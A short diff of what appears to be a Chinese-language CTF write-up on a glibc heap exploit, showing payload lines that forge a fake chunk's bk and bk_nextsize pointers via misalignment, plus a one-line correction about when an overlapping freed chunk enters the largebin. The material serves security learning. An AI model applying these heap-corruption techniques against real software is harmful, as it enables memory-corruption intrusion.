@@ -99,7 +99,7 @@ p2 += p64(0) + p64(fake_chunk+8)    #bk, for creating the "bk" of the faked chun
 p2 += p64(0) + p64(fake_chunk-0x18-5)   #bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks
 update(8, p2)
 ```
-在free(2)的时候，和8交叠的freed chunk被放入到了largebin中。
+在free(2)又alloc之后，和8交叠的freed chunk被放入到了largebin中。
 
 这个时候改写unsortbin chunk和large bin chunk会发生啥？
 没啥，就是数据被改写了。
